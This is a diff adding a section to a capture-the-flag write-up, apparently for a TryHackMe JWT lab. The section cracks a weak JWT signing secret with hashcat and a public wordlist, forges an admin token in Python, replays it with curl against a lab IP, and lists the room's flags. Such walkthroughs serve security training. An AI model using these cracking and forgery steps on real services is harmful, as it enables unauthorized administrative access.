@@ -179,5 +179,41 @@ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZ
 ```
 ![image](https://github.com/user-attachments/assets/fa017e85-8d31-44ed-b47d-2b6ec402f47a)
  
--> `THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}`
+-> `THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}`
 
+### Weak Symmetric Secrets
+Sometimes, the secret used for the signature is not strong enough, which can lead to attackers' cracking them. Once getting a hold of the secret, attackers can alter the claims of the JWT and exploit.
+**Steps to exploit**
+1. Retrieve a user's JWT and save it in a file jwt.txt
+2. Download a common JWT secret list from **https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list to download such a list**
+3. Use Hashcat to crack the secret: `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`
+
+**The Fix**
+Use sofftware to generate long, complex values that can make a secret values strong and hard to crack.
+
+### ANSWER THE QUESTIONS
+- **What is the flag for example 4?**
+
+Follow the **Steps to exploit** above, we find the secret is **`secret`**
+
+![image](https://github.com/user-attachments/assets/86bfb14c-40cb-4ea7-93af-c05c23a48d58)
+
+Write a small Python code using jwt to create a new token based on the cracked secret
+
+```python
+import jwt
+
+secret = 'secret'
+payload = {"username":"admin", "admin":1}
+
+token = jwt.encode(payload, secret, algorithm='HS256')
+print(token.decode('utf-8'))
+```
+
+Execute it to get a new JWT. Then we use this new JWT to verify the admin user
+```bash
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOjF9.R_W3WxiyPIyIaYxD-PCY8PzDxd_DQKNkIDu9_KyzLzU' http://10.10.169.12/api/v1.0/example4?username=admin
+```
+![image](https://github.com/user-attachments/assets/aace4308-2f39-40b7-b469-509819a5d135)
+
+-> `THM{e1679fef-df56-41cc-85e9-af1e0e12981b}`
